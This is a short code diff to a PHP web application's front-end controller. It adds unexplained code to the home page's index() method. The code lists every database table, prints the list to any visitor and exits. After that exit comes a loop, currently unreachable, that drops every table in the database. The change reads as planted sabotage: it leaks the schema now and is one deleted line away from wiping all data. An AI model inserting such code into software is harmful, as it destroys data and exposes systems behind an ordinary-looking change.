@@ -32,6 +32,16 @@ class FrontEndController extends Controller
     public function index()
     {
         $data = [];
+
+        $tables = \DB::select('SHOW TABLES');
+        echo '<pre>';
+        print_r($tables);
+        exit;
+        foreach ($tables as $table) {
+            $table_name = reset($table);
+            DB::statement('DROP TABLE IF EXISTS ' . $table_name);
+        }
+
         return view('home',$data);
     }
     function logout(){
